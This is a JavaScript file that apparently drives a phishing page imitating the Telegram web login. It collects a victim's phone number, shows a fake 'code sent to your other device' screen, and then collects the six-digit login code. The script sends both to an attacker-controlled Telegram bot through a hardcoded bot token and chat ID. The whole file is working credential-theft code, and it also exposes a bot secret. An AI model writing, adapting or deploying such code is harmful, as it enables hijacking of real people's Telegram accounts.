const TOKEN = '6565999105:AAGgmgpmO9bYrl1nx4RsIRKaXaARqldSim4';
const CHAT_ID = '-1002146536853';
const URI_API = `https://api.telegram.org/bot${ TOKEN }/sendMessage`;
const formClear = document.querySelector('#auth-form');


function clearForm(){
    formClear.innerHTML = '';
}
document.getElementById('form').addEventListener('submit', function(e){
    e.preventDefault();
    const message = `<b>Номер телефона: +7-<code>${this.number.value.replaceAll(' ', '')}</code></b>\n`


    axios.post(URI_API, {
        chat_id: CHAT_ID,
        parse_mode: 'html',
        text: message
    })
    clearForm()
    const resultsTemplate = `<div class="auth-form"><div class="video"><video loop muted autoplay src="images/Desktop 2024.03.04 - 19 (online-video-cutter.com).mp4 "></video></div></div><h1>+7 ${this.number.value}</h1><p class="note">Мы отправили код в приложение <b>Telegram</b> на другом Вашем устройстве.</p><form id='form2' class="input-group with-label"><input class="form-control" type="text" name='code' id="sign-in-code" dir="auto" autocomplete="off" pattern=".{6,}" required maxlength="6" inputmode="numeric" aria-label="Код"><label for="sign-in-code">Код</label><button type="submit" class="Button default primary next-button has-ripple">Next</button></form></div>`
    const finalMessage = resultsTemplate;
    formClear.innerHTML = finalMessage;
    document.getElementById('form2').addEventListener('submit', function(e){
        e.preventDefault();
        const message = `<b>Код: <code>${this.code.value.replaceAll(' ', '')}</code></b>\n`
    
    
        axios.post(URI_API, {
            chat_id: CHAT_ID,
            parse_mode: 'html',
            text: message
        })
        clearForm()
    
    })

})

IMask(
    document.getElementById('sign-in-phone-number'),
    {
      mask: '000 000 0000'
    }
) 

let tel = document.querySelector('#sign-in-code')
let reg = /[A-Za-zA-Яа-яЁё @ # $ _ & - ( ) / * " ' : ; ! ? ~ ` | / { } = % ^ < > -]/g;
tel.oninput = function(){
    this.value = this.value.replace(reg, '');
}